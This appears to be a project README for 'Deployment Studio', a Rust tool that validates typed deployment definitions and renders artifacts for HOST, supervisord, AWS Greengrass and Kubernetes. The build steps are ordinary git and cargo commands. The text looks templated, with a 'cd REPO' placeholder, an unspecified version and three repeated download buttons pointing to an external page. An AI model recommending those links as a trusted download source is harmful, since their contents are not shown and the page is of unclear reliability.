# Deployment Studio - Deployment Control Plane 2026

> **Deployment Studio is a cross-platform Rust control plane for defining, validating, compiling, and reviewing deployments across HOST, supervisord, AWS Greengrass, and Kubernetes workflows.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ethan-scottsx9848/deployment-studio-workflow-hub?style=flat-square)](https://github.com/ethan-scottsx9848/deployment-studio-workflow-hub)

---

<p align="center">
  <a href="https://ethan-scottsx9848.github.io/deployment-studio-workflow-hub/">
    <img src="https://img.shields.io/badge/Download-Deployment%20Studio%20Latest-brightgreen?style=for-the-badge" alt="Download Deployment Studio">
  </a>
</p>

> **[Download Deployment Studio](https://ethan-scottsx9848.github.io/deployment-studio-workflow-hub/)**

---

[Download Latest Build](https://ethan-scottsx9848.github.io/deployment-studio-workflow-hub/)

---

## What Deployment Studio Does

Deployment Studio turns deployment intent into typed definitions that can be checked, compiled, and reviewed from one control plane. Its Rust kernel validates those definitions and produces deterministic, platform-specific artifacts, making it possible to inspect generated results before applying them.

The same workflow covers local HOST environments, supervisord-managed services, AWS Greengrass things, and Kubernetes clusters. Deployment definitions can be tracked in Git for an auditable change history, while evidence-gated releases and proof-focused tests provide a reviewable route from configuration through deployment.

---

## Capabilities

- Define deployments with a structured typed schema
- Compile definitions deterministically into native target artifacts
- Produce HOST and supervisord bundles
- Create AWS Greengrass recipes and deployments for individual things
- Generate Kubernetes manifests
- Preserve deployment-change history through Git
- Use generate-only runs to inspect output before applying it
- Validate and render deployments with oracle-based proof testing
- Support releases gated by deployment evidence

---

## Getting Started

### Check out the source

```bash
git clone https://github.com/ethan-scottsx9848/deployment-studio-workflow-hub.git
cd REPO
```

### Compile the Rust kernel

Install Rust and Cargo, then create an optimized build:

```bash
cargo build --release
```

The release output provides the binary used by the Deployment Studio CLI. To see the commands supported by the current project, run:

```bash
cargo run -- --help
```

The compiled release executable is also available in the repository's Rust build output.

---

## Working with the CLI

Deployment Studio is organized around a deliberate sequence: author a definition, validate it, generate artifacts, review the result, and then apply it through the relevant platform process.

1. Write or modify a typed deployment definition.
2. Check the definition against the deployment schema.
3. Render artifacts for the desired target.
4. Inspect the generated files and commit relevant changes to Git.
5. Execute deployment proof or oracle-based verification.
6. Apply the reviewed artifacts using the target platform workflow.

For example:

```bash
cargo run -- validate path/to/deployment-definition
cargo run -- render path/to/deployment-definition --target kubernetes
cargo run -- render path/to/deployment-definition --target greengrass
```

Command and option details can be queried directly from the build:

```bash
cargo run -- --help
cargo run -- validate --help
cargo run -- render --help
```

Because rendering is separate from application, platform-native output can be examined before any deployment apply step is approved.

---

## Deployment Definitions

Deployment-definition files are the main configuration interface. Keep them under Git alongside the project so definition edits, schema changes, rendered artifacts, reviews, and release evidence remain connected to the repository history.

A simplified definition can be structured as follows:

```yaml
name: example-deployment
targets:
  - kubernetes
services:
  - name: example-service
    source: ./service
```

The project's typed schema determines the complete field set and the target values that are supported. Validate a definition before asking the CLI to render it:

```bash
cargo run -- validate path/to/deployment-definition
```

---

## Requirements

- A supported cross-platform development environment
- Rust and Cargo to build or execute the CLI
- Git to manage source history and deployment audit records
- Access to the destination platform when applying generated artifacts
- Storage for definitions, rendered files, and Git history

Depending on the selected target, the workflow may also need the tooling and credentials used by Kubernetes, AWS Greengrass, HOST, or supervisord environments.

---

## Frequently Asked Questions

### What teams use Deployment Studio?

Deployment Studio is designed for teams operating across several execution environments, such as local hosts, supervisord services, AWS Greengrass devices, and Kubernetes clusters.

### How can I discover the CLI commands?

Start with the top-level help command:

```bash
cargo run -- --help
```

Individual commands expose their own options. For example:

```bash
cargo run -- render --help
```

### Is it possible to inspect artifacts without deploying them?

Yes. The generate-only workflow renders the requested artifacts for inspection and review without requiring an apply step.

### Where do deployment definitions belong?

Keep definitions in the repository owned by the deployment project. This allows Git to record definition changes and maintain an audit trail for generated results.

### What happens after a validation error?

Use the validation output to locate the schema or definition problem, update the source file, and validate it again before rendering any target artifacts.

### How do I get a newer build?

Download the repository's latest build or update the source checkout, then rebuild the Rust CLI:

```bash
git pull
cargo build --release
```

### Which deployment targets are supported?

The profile generates HOST and supervisord bundles, AWS Greengrass recipes and per-thing deployments, plus Kubernetes manifests.

---

## Roadmap

- Broaden typed deployment-definition coverage
- Continue improving validation and artifact-rendering workflows
- Strengthen evidence-gated release support
- Expand proof testing across the supported deployment targets

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
